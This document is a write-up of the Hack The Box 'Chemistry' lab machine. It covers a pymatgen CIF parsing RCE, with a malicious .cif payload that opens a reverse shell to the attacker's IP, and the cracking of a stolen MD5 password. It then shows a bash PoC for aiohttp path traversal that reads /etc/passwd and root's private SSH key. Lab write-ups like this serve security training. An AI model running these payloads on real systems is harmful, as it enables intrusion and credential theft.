Tags: #Linux/Ubuntu #Easy #Python #Werkzeug #RCE #Weak-Hashing-Algorithms  #Password-Cracking #Outdated-software #LFI
# **Nmap Results**

```text
Nmap scan report for 10.10.11.38
Host is up (0.087s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Sun, 29 Dec 2024 15:42:35 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1>
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
|     <div class="buttons">
|     <center><a href="/login" class="btn">Login</a>
|     href="/register" class="btn">Register</a></center>
|     </div>
|     </div>
|     </body>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=12/29%Time=67716DE9%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,38A,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3
SF:\x20Python/3\.9\.5\r\nDate:\x20Sun,\x2029\x20Dec\x202024\x2015:42:35\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x20719\r\nVary:\x20Cookie\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20
SF:html>\n<html\x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=
SF:\"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"wid
SF:th=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Chemi
SF:stry\x20-\x20Home</title>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\
SF:x20href=\"/static/styles\.css\">\n</head>\n<body>\n\x20\x20\x20\x20\n\x
SF:20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\n\x20\x20\x20\x20<div\x20class
SF:=\"container\">\n\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\"title\"
SF:>Chemistry\x20CIF\x20Analyzer</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>
SF:Welcome\x20to\x20the\x20Chemistry\x20CIF\x20Analyzer\.\x20This\x20tool\
SF:x20allows\x20you\x20to\x20upload\x20a\x20CIF\x20\(Crystallographic\x20I
SF:nformation\x20File\)\x20and\x20analyze\x20the\x20structural\x20data\x20
SF:contained\x20within\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<div\x20clas
SF:s=\"buttons\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<center
SF:><a\x20href=\"/login\"\x20class=\"btn\">Login</a>\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20<a\x20href=\"/register\"\x20class=\"btn\">R
SF:egister</a></center>\n\x20\x20\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\
SF:x20\x20</div>\n</body>\n<")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML\x20PUB
SF:LIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x
SF:20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Con
SF:tent-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>
SF:\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20
SF:response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400
SF:</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20
SF:version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Er
SF:ror\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20r
SF:equest\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20
SF:</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/
```
<br>
<br>

# **Service Enumeration**
Nmap results found a Python Werkzeug web server on port 5000, so I will navigate there in my browser to see what I can find:

![[Pasted image 20241229110517.png]]

Looks to be a site that processes CIF files, which contain data on the arrangement of atoms within a crystal. We have the option to login but we can also register, which is what we'll do for now. We'll just use simple credentials like test:test. Here's the dashboard we get after logging in:

![[Pasted image 20241229110916.png]]

They provide us an example .cif file to download. Let's take a look at it:

![[Pasted image 20241229111723.png]]

I know that the webserver is running on python, so the cif parser is most likely written in python as well. I quickly search online for "python CIF processor RCE POC" and immediately get multiple results about a library "pymatgen" that has a critical RCE vulnerability:

![[Pasted image 20241229130235.png]]

Github usually has reliable POC scripts so I click on the [first result](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f) and examine the nature of the exploit. 
<br>
<br>
# **Exploitation**
## **Initial Access**
The post explains that the vulnerability arises from python's use of the `eval()` function "even with \_\_builtins\_\_ set to None". An attacker can use subclass traversal and access the `BuiltinImporter` class, allowing them to import any module they want. On top of that, since there is no input sanitization, an attacker can execute python code with the privileges of the user running the server. 

The author then provides a malicious .cif file with the subclass traversal payload. It accesses the `BuiltinImporter` class, loads the `os` module, and calls the `system()` function, allowing the execution of system level commands. Right now it just creates a file named "pwned", but we can insert a reverse shell one liner like `busybox nc 10.10.14.10 9001 -e sh` while having a listener set up to obtain a shell. I created a file "payload.cif", pasted the exploit from github, and inserted the command. Here's what it looks like:

```
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("busybox nc 10.10.14.10 9001 -e sh");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

![[Pasted image 20241229140845.png]]

After I clicked on view, my listener caught the request and I'm now logged in as **app**. 
![[Pasted image 20241229141002.png]]

I want to see if there are other users on the machine so I run `cat /etc/passwd | grep sh$` so that only users with interactive shells are printed on the screen:

```
root:x:0:0:root:/root:/bin/bash
rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
app:x:1001:1001:,,,:/home/app:/bin/bash

```

We want to escalate privileges to rosa, so we'll do some local enumeration. Right now I'm placed in the **/home/app** directory:

![[Pasted image 20241229142053.png]]

app.py is the configuration of the python webserver. Looking at its contents there is one line of interest

![[Pasted image 20241229142404.png]]

The web server uses a sqlite database and the secret key is `MyS3cretCh3mistry4PP`. The secret key isn't useful here because we don't need to forge cookies or perform CSRF attacks, as we already have a shell on the machine.

Looking around, there is a **database.db** file in the **instance** directory. There should be some valuable info inside:

![[Pasted image 20241229143033.png]]

I found Rosa's password hash. Looks to be an MD5 hash. Hashes.com confirmed it and cracked the hash for us too:

![[Pasted image 20241229143228.png]]

Her password is `unicorniosrosados`. Next step would be to try and SSH into the box with these creds:

![[Pasted image 20241229143407.png]]

Boom, we're logged in as Rosa now.
<br>
<br>

## **Post-Exploit Enumeration**
### **Operating Environment**

> [!tldr]- Current User
> - `id` output:
>	`uid=1000(rosa) gid=1000(rosa) groups=1000(rosa)`
> - `sudo -l` output:
>	`Sorry, user rosa may not run sudo on chemistry.`
<br>

### **Network Configurations**

>[!tldr]- Open Ports
>`netstat -tanup | grep LISTEN` output:
>```
> (Not all processes could be identified, non-owned process info
>  will not be shown, you would have to be root to see it all.)
> tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
> tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
> tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
> tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      -                   
> tcp6       0      0 :::22                   :::*                    LISTEN      - 
>```

<br>

### **Processes and Services**

> [!tldr]- Interesting Processes
> Interesting process running as root, found by `ps aux | grep root`:
> `root        1073  1.3  2.6 280880 52372 ?        Rsl  15:41   3:50 /usr/bin/python3.9 /opt/monitoring_site/app.py`
<br>

### **Interesting Files**

> [!tldr]- /opt/monitoring_site
> Unable to view or edit contents due to insufficient permissions
<br>
<br>

# **Privilege Escalation**  
Local enumeration revealed there was something listening locally on port 8080, so I exited the SSH session and logged back with port forwarding to expose that port, allowing me to see what's there. The command I used to do that was: `ssh -L 8080:localhost:8080 rosa@10.10.11.38`, which tells my local machine to forward all requests made to it through port 8080 to the remote server's local machine on port 8080. So when I navigate to localhost:8080 on my browser, that connection will get sent through the SSH tunnel and the remote machine will respond.

The output of `netstat` didn't tell me the process bound to that port but I guessed it was a web server because 8080 is a common port for web servers besides 80. Here's what I see in my browser:

![[Pasted image 20241229165454.png]]

Turns out it was a web server after all. It's also being ran as root, according to the output of `ps aux | grep root`. There is a button "List Services" that allows us to see services that are running and others that are stopped, but the Start and Stop Service buttons are non functional. 

We need more info about this webpage, so we'll run `whatweb` against it. Here's what we get:

```
WhatWeb report for http://localhost:8080
Status    : 200 OK
Title     : Site Monitoring
IP        : <Unknown>
Country   : <Unknown>

Summary   : HTML5, HTTPServer[Python/3.9 aiohttp/3.9.1], JQuery[3.6.0], Script

Detected Plugins:
[ HTML5 ]
        HTML version 5, detected by the doctype declaration 


[ HTTPServer ]
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        String       : Python/3.9 aiohttp/3.9.1 (from server string)

[ JQuery ]
        A fast, concise, JavaScript that simplifies how to traverse 
        HTML documents, handle events, perform animations, and add 
        AJAX. 

        Version      : 3.6.0
        Website     : http://jquery.com/

[ Script ]
        This plugin detects instances of script HTML elements and 
        returns the script language/type. 


HTTP Headers:
        HTTP/1.1 200 OK
        Content-Type: text/html; charset=utf-8
        Content-Length: 5971
        Date: Sun, 29 Dec 2024 21:57:30 GMT
        Server: Python/3.9 aiohttp/3.9.1
        Connection: close

``` 

The scan discovers that the webserver uses **aiohttp 3.9.1**. Now we need to see if we can find any known vulnerabilities and a POC to go with it. There are many sites online talking about a path traversal vulnerability, but I chose to look at the one [on GitHub](https://github.com/z3rObyte/CVE-2024-23334-PoC):

![[Pasted image 20241229170841.png]]

Fortunately there is also a poc attached, which we will use. I made a few changes to match my target, like changing the port number and the directory in the **payload** variable (/static/ was the original directory, it didn't exist on the site) and then executed the script:
```bash
#!/bin/bash

url="http://localhost:8080"
string="../"
payload="/assets/"
file="etc/passwd" # without the first /

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"
    
    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
```

![[Pasted image 20241229174028.png]]

It successfully returned the /etc/passwd file. Since this server is running as root, our LFI script has the same privileges, meaning it can retrieve any file on the system. We could just grab the root flag from here but the point is to obtain access to the root user (at least that's what I think), so we have to grab a file that will lead us closer to a root shell. 

If the root user has a private key, we can get that through the script and use it to SSH into the box. The path to that would normally be /root/.ssh/id_rsa, so I modified the script and executed it:

![[Pasted image 20241229174543.png]]

Excellent. All I had to do now was save it to a file "id_rsa", change it's permissions with `sudo chmod 600 id_rsa` so that ssh will allow the key to be used, and run `ssh -i id_rsa root@10.10.11.38`:

![[Pasted image 20241229174826.png]]

That's it! We're root!
<br>
<br>
# Skills/Concepts Learned
- **Even with limited info, use google to your advantage**. In the service enumeration step, I knew that python was running the web server but I didn't know the exact library that was in use. However a simple "python CIF processor RCE POC" search in this case will at least lead you in the right direction, if it doesn't give you the answer. 
- `whatweb` is a powerful tool for enumerating a website's underlying technologies, such as web servers, CMS, JS libraries, security features (WAF, HTTPS, etc.), and more. It has hundreds of different plugins to extend detection capabilities. **Use it in conjunction with basic enumeration techniques if needed and/or when Wappalyzer fails to discover sufficient info** 
<br>
<br>
# Proof of Pwn
https://www.hackthebox.com/achievement/machine/391579/631